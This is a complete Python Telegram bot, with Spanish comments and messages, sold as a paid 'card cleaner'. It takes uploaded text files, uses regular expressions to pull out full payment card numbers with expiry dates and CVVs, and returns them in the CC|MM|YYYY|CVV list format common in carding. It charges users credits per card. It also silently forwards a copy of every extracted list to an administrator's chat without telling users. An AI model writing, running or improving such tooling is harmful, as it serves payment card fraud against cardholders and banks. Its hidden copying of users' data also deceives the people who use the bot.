import io
import os
import re
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# Configuración desde Variables de Entorno de Railway
TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")  # Tu ID numérico de Telegram para recibir los TXT

# Ruta persistente en Railway (se almacena en un Volume montado en /app/data)
DATA_DIR = os.getenv("DATA_DIR", "./data")
os.makedirs(DATA_DIR, exist_ok=True)
ARCHIVO_USUARIOS = os.path.join(DATA_DIR, "usuarios.txt")

COSTO_POR_TARJETA = 0.2  # 20 créditos por cada 100 tarjetas

# Reglas de coincidencia (Regex)
PATRON_LINEA = re.compile(
    r'(?<!\d)(\d{15,16})[|/\s,-;:]+(0[1-9]|1[0-2])[|/\s,-;:]*[/|-]?\s*(20\d{2}|\d{2})[|/\s,-;:]+(\d{3,4})(?!\d)'
)
PATRON_BLOQUE = re.compile(
    r'(?:Numero\s*:\s*)?(\d{15,16})[\s\S]*?Exp\s*:\s*(0[1-9]|1[0-2])[/|-]?(20\d{2}|\d{2})[\s\S]*?CVV\s*:\s*(\d{3,4})',
    re.IGNORECASE,
)
PATRON_BLOQUE_SIN_ETIQUETA = re.compile(
    r'(?<!\d)(\d{15,16})\s*[\r\n]+\s*Exp\s*:\s*(0[1-9]|1[0-2])\s*[/|-]?\s*(20\d{2}|\d{2})\s*[\r\n]+\s*CVV\s*:\s*(\d{3,4})',
    re.IGNORECASE,
)
PATRON_HASHTAG = re.compile(
    r'(?<!\d)(\d{15,16})#(0[1-9]|1[0-2])#(20\d{2}|\d{2})#(\d{3,4})(?!\d)'
)


def cargar_usuarios():
    usuarios = {}
    if not os.path.exists(ARCHIVO_USUARIOS):
        return usuarios

    with open(ARCHIVO_USUARIOS, "r", encoding="utf-8") as f:
        for linea in f:
            linea = linea.strip()
            if not linea:
                continue
            partes = [p.strip() for p in linea.split(",")]
            if len(partes) >= 3:
                user_id = int(partes[0])
                username = partes[1]
                try:
                    creditos = float(partes[2])
                except ValueError:
                    creditos = 0.0
                usuarios[user_id] = {"username": username, "creditos": creditos}
    return usuarios


def guardar_usuarios(usuarios):
    with open(ARCHIVO_USUARIOS, "w", encoding="utf-8") as f:
        for user_id, datos in usuarios.items():
            cred_val = (
                int(datos["creditos"])
                if datos["creditos"].is_integer()
                else round(datos["creditos"], 2)
            )
            f.write(f"{user_id},{datos['username']},{cred_val}\n")


def obtener_creditos_usuario(user_id: int, username: str) -> float:
    usuarios = cargar_usuarios()
    if user_id in usuarios:
        if username and usuarios[user_id]["username"] != username:
            usuarios[user_id]["username"] = username
            guardar_usuarios(usuarios)
        return usuarios[user_id]["creditos"]
    else:
        nombre_user = username if username else "SinUsername"
        usuarios[user_id] = {"username": nombre_user, "creditos": 0.0}
        guardar_usuarios(usuarios)
        return 0.0


def descontar_creditos_usuario(user_id: int, cantidad: float) -> float:
    usuarios = cargar_usuarios()
    if user_id in usuarios:
        usuarios[user_id]["creditos"] = max(
            0.0, usuarios[user_id]["creditos"] - cantidad
        )
        guardar_usuarios(usuarios)
        return usuarios[user_id]["creditos"]
    return 0.0


def procesar_texto(texto: str) -> list[str]:
    tarjetas_encontradas = []

    for linea in texto.splitlines():
        coincidencia = PATRON_LINEA.search(linea.strip())
        if coincidencia:
            cc, mes, year, cvv = coincidencia.groups()
            if len(year) == 2:
                year = f"20{year}"
            tarjeta_formateada = f"{cc}|{mes}|{year}|{cvv}"
            if tarjeta_formateada not in tarjetas_encontradas:
                tarjetas_encontradas.append(tarjeta_formateada)

    for coincidencia in PATRON_BLOQUE.finditer(texto):
        cc, mes, year, cvv = coincidencia.groups()
        if len(year) == 2:
            year = f"20{year}"
        tarjeta_formateada = f"{cc}|{mes}|{year}|{cvv}"
        if tarjeta_formateada not in tarjetas_encontradas:
            tarjetas_encontradas.append(tarjeta_formateada)

    for coincidencia in PATRON_BLOQUE_SIN_ETIQUETA.finditer(texto):
        cc, mes, year, cvv = coincidencia.groups()
        if len(year) == 2:
            year = f"20{year}"
        tarjeta_formateada = f"{cc}|{mes}|{year}|{cvv}"
        if tarjeta_formateada not in tarjetas_encontradas:
            tarjetas_encontradas.append(tarjeta_formateada)

    for linea in texto.splitlines():
        coincidencia = PATRON_HASHTAG.search(linea.strip())
        if coincidencia:
            cc, mes, year, cvv = coincidencia.groups()
            if len(year) == 2:
                year = f"20{year}"
            tarjeta_formateada = f"{cc}|{mes}|{year}|{cvv}"
            if tarjeta_formateada not in tarjetas_encontradas:
                tarjetas_encontradas.append(tarjeta_formateada)

    return tarjetas_encontradas


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    creditos = obtener_creditos_usuario(user.id, user.username or "SinUsername")

    teclado = [
        [
            InlineKeyboardButton("ℹ️ DETALLES", callback_data="btn_detalles"),
            InlineKeyboardButton("🔥 FILTRO CARBÓN", callback_data="btn_filtro"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(teclado)

    mensaje = (
        f"<b>¡Bienvenido al Bot Limpiador de Tarjetas!</b> 🤖\n\n"
        f"👤 <b>Usuario:</b> @{user.username if user.username else 'SinUsername'}\n"
        f"💳 <b>Créditos disponibles:</b> <code>{creditos:g}</code>\n\n"
        f"Puedes enviar tu archivo <b>.txt</b> directamente al chat en cualquier momento, "
        f"o usar el menú interactivo:"
    )

    if update.message:
        await update.message.reply_text(
            mensaje, parse_mode="HTML", reply_markup=reply_markup
        )
    elif update.callback_query:
        await update.callback_query.edit_message_text(
            mensaje, parse_mode="HTML", reply_markup=reply_markup
        )


async def cmd_creditos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    creditos = obtener_creditos_usuario(user.id, user.username or "SinUsername")
    await update.message.reply_text(
        f"💳 <b>Tus créditos actuales:</b> <code>{creditos:g}</code>",
        parse_mode="HTML",
    )


async def manejar_botones(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "btn_detalles":
        texto_detalles = (
            "<b>📖 CÓMO FUNCIONA EL BOT</b>\n\n"
            "• <b>Función:</b> Filtra y limpia archivos <code>.txt</code> extrayendo datos de tarjetas.\n"
            "• <b>Formato de Salida:</b> <code>CC|MM|YYYY|CVV</code>.\n"
            "• <b>Tarifa del sistema:</b> <code>20 créditos</code> por cada <code>100 tarjetas</code> extraídas (0.2 créditos por tarjeta).\n"
            "• <b>Soporte:</b> Detecta fechas separadas por <code>/</code>, <code>-</code>, <code>#</code> o <code>|</code> e ignora texto basura.\n\n"
            "<b>Uso directo:</b> Solo adjunta tu archivo <code>.txt</code> al chat en cualquier momento."
        )
        teclado = [
            [InlineKeyboardButton("⬅️ Volver", callback_data="btn_volver")]
        ]
        await query.edit_message_text(
            texto_detalles,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(teclado),
        )

    elif query.data == "btn_filtro":
        texto_filtro = (
            "<b>📂 MODO FILTRO CARBÓN LISTO</b>\n\n"
            "Adjunta o arrastra tu archivo <b>.txt</b> directamente a este chat para limpiarlo."
        )
        teclado = [
            [InlineKeyboardButton("⬅️ Volver", callback_data="btn_volver")]
        ]
        await query.edit_message_text(
            texto_filtro,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(teclado),
        )

    elif query.data == "btn_volver":
        await start(update, context)


async def procesar_documento(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    user = update.effective_user
    user_id = user.id
    username = user.username or "SinUsername"

    creditos_actuales = obtener_creditos_usuario(user_id, username)
    if creditos_actuales <= 0:
        await update.message.reply_text(
            "❌ <b>Créditos insuficientes.</b>\n"
            "No tienes créditos disponibles para realizar esta operación. Contacta al administrador para recargar.",
            parse_mode="HTML",
        )
        return

    documento = update.message.document

    if not documento.file_name.endswith(".txt"):
        await update.message.reply_text(
            "❌ Error: El archivo debe tener extensión <b>.txt</b>.",
            parse_mode="HTML",
        )
        return

    msg_espera = await update.message.reply_text(
        "⏳ Procesando archivo, por favor espera..."
    )

    archivo_telegram = await context.bot.get_file(documento.file_id)
    contenido_bytes = await archivo_telegram.download_as_bytearray()
    texto_entrada = contenido_bytes.decode("utf-8", errors="ignore")

    tarjetas_limpias = procesar_texto(texto_entrada)

    if tarjetas_limpias:
        cant_tarjetas = len(tarjetas_limpias)
        costo_total = round(cant_tarjetas * COSTO_POR_TARJETA, 2)

        if creditos_actuales < costo_total:
            await msg_espera.delete()
            await update.message.reply_text(
                f"❌ <b>Créditos insuficientes para este archivo.</b>\n\n"
                f"• Tarjetas encontradas: <code>{cant_tarjetas}</code>\n"
                f"• Créditos requeridos: <code>{costo_total:g}</code>\n"
                f"• Tus créditos: <code>{creditos_actuales:g}</code>\n\n"
                f"Recarga más créditos para procesar este archivo.",
                parse_mode="HTML",
            )
            return

        saldo_restante = descontar_creditos_usuario(user_id, costo_total)

        resultado_txt = "\n".join(tarjetas_limpias)
        
        # Generar buffer para enviar al usuario
        archivo_salida = io.BytesIO(resultado_txt.encode("utf-8"))
        nombre_salida = f"{documento.file_name.rsplit('.', 1)[0]}_limpio.txt"
        archivo_salida.name = nombre_salida

        # Enviar al usuario que procesó
        await update.message.reply_document(
            document=archivo_salida,
            caption=(
                f"✅ <b>PROCESAMIENTO FINALIZADO</b>\n\n"
                f"• Tarjetas extraídas: <code>{cant_tarjetas}</code>\n"
                f"• Créditos cobrados: <code>{costo_total:g}</code>\n"
                f"• Créditos restantes: <code>{saldo_restante:g}</code>"
            ),
            parse_mode="HTML",
        )

        # Copia de seguridad enviada al Administrador
        if ADMIN_ID:
            try:
                archivo_admin = io.BytesIO(resultado_txt.encode("utf-8"))
                archivo_admin.name = f"[COPIA]_{nombre_salida}"
                await context.bot.send_document(
                    chat_id=int(ADMIN_ID),
                    document=archivo_admin,
                    caption=(
                        f"📥 <b>NUEVO ARCHIVO PROCESADO</b>\n\n"
                        f"👤 <b>Usuario:</b> @{username} (ID: <code>{user_id}</code>)\n"
                        f"💳 <b>Tarjetas:</b> <code>{cant_tarjetas}</code>\n"
                        f"💰 <b>Cobrado:</b> <code>{costo_total:g}</code> créditos"
                    ),
                    parse_mode="HTML",
                )
            except Exception as e:
                print(f"Error al enviar la copia al admin: {e}")
    else:
        await update.message.reply_text(
            "⚠️ No se encontraron tarjetas válidas con el formato requerido en el archivo."
        )

    await msg_espera.delete()


def main():
    if not TOKEN:
        raise ValueError("Error: La variable TELEGRAM_TOKEN no está configurada.")

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("creditos", cmd_creditos))
    app.add_handler(CallbackQueryHandler(manejar_botones))
    app.add_handler(MessageHandler(filters.Document.ALL, procesar_documento))

    print("Bot ejecutándose correctamente...")
    app.run_polling()


if __name__ == "__main__":
    main()
